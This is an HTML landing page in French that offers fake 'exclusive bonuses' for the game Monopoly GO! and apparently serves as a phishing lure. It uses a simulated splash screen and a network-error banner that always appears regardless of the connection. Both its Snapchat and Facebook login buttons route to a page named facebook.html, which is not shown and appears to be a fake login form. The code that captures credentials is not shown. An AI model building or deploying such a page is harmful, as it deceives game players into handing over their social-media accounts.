
<!DOCTYPE html>
<html lang="fr">
<head>

  <!-- ✅ Balises Open Graph pour aperçus sociaux -->
  <meta property="og:title" content="Monopoly GO! - Dual" />
  <meta property="og:description" content="Accédez à des bonus exclusifs pour Monopoly GO!" />
  <meta property="og:image" content="https://monopoly-go-dual.onrender.com/preview.jpg" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:url" content="https://monopoly-go-dual.onrender.com/index.html" />
  <meta property="og:type" content="website" />

  <meta charset="UTF-8" />
  <title>Monopoly GO! - Dual</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #c5f1de;
      overflow: hidden;
    }

    .splash-screen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background-color: #b7f0d3;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      flex-direction: column;
    }

    .splash-screen img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0; left: 0;
      z-index: -1;
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #333;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: white;
      background: rgba(0, 0, 0, 0.6);
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 16px;
    }

    .error-banner {
      display: none;
      position: fixed;
      top: 0;
      width: 100%;
      background-color: #ff4c4c;
      color: white;
      text-align: center;
      padding: 12px 0;
      font-weight: bold;
      z-index: 9998;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      padding: 20px;
      text-align: center;
    }

    .btn {
      display: block;
      padding: 12px 24px;
      margin: 10px auto;
      border-radius: 24px;
      text-decoration: none;
      font-weight: bold;
      width: 80%;
      max-width: 280px;
      text-align: center;
    }

    .btn-facebook {
      background: #1877f2;
      color: white;
    }

    .btn-facebook:hover {
      background: #0e65d0;
    }

    .btn-snapchat {
      background: #fffc00;
      color: black;
      border: 2px solid #000;
    }

    .btn-snapchat:hover {
      background: #e7e300;
    }
  </style>
</head>
<body>
  <div class="splash-screen" id="splash">
    <img src="splash_monopolygo_simule.jpg" alt="Splash Monopoly GO">
    <div class="spinner"></div>
    <div class="loading-text">Chargement...</div>
  </div>

  <div class="error-banner" id="errorBanner">Erreur réseau : veuillez vérifier votre connexion et réessayer.</div>

  <div class="container" id="mainContent" style="display: none;">
    <img src="preview.jpg" alt="Aperçu Monopoly GO" style="max-width: 300px; margin-bottom: 20px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
    <h1>Monopoly GO! – Dual</h1>
    <p>Accédez à des bonus exclusifs, des extensions et d'autres outils spécialement conçus pour Monopoly GO!</p>
    <a class="btn btn-snapchat" href="facebook.html?reseau=snapchat">Se connecter avec Snapchat</a>
    <a class="btn btn-facebook" href="facebook.html?reseau=facebook">Se connecter avec Facebook</a>
  </div>

  <script>
    window.onload = function () {
      setTimeout(() => {
        document.getElementById('splash').style.display = 'none';
        document.getElementById('errorBanner').style.display = 'block';
        document.getElementById('mainContent').style.display = 'flex';
      }, 2000);
    };
  </script>
</body>
</html>
